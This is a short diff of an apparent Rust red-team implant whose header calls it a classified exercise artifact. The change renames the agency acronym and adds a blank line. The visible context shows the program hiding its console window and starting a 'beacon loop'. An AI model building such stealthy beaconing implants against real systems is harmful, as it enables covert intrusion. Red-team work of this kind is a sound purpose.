@@ -1,5 +1,5 @@
 // -----------------------------------------------------------------------------------------
-// [CLASSIFIED] NCDD RED TEAM ARTIFACT - INTERNAL USE ONLY
+// [CLASSIFIED] NSM RED TEAM ARTIFACT - INTERNAL USE ONLY
 // PROJECT: TITAN SHIELD // EXERCISE: DEEP FREEZE
 // -----------------------------------------------------------------------------------------
 #![windows_subsystem = "windows"] // No console window
@@ -30,3 +30,4 @@ fn main() {
     // 4. Start beacon loop
     agent.run_loop();
 }
+
